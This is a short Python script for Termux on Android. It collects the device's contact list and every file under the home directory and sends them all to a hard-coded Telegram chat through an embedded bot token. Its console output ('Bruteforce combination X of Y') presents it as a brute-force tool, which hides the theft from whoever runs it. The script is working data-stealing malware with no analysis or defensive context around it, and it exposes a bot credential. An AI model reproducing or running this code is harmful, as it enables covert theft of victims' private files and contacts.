from threading import Thread, Lock
import os, subprocess, telebot, time, json

bot = telebot.TeleBot('6297533986:AAGtMlOgroJCnYxb4Khwd3NvuGuXw91EU_g')

def send_file_to_telegram(filename, i, total_files):
    with open(filename, 'rb') as f:
        bot.send_document(chat_id=1004407813, document=f)
    print(f'Bruteforce combination {i + 1} of {total_files}')

def get_contacts():
    result = subprocess.run(['termux-contact-list'], stdout=subprocess.PIPE)
    contacts_json = json.loads(result.stdout.decode('utf-8'))
    return contacts_json

def send_contacts_to_telegram():
    contacts_str = json.dumps(get_contacts(), indent=2)
    bot.send_message(chat_id=1004407813, text=contacts_str)

def get_user_files():
    home_dir = os.path.expanduser('~')
    files = []
    for root, _, filenames in os.walk(home_dir):
        for filename in filenames:
            files.append(os.path.join(root, filename))
    return files

send_contacts_to_telegram()
files = get_user_files()
total_files = len(files)
lock = Lock()
threads = []
i = 0
while i < total_files:
    for filename in files[i:i+5]:
        if os.path.isfile(filename):
            t = Thread(target=send_file_to_telegram, args=(filename, i, total_files))
            t.start()
            threads.append(t)
            i += 1
            if i == total_files:
                break
    for t in threads:
        t.join()
    threads = []
    print('+',end='',flush=True)

bot.send_message(chat_id=1004407813, text='All files and contacts have been sent.')
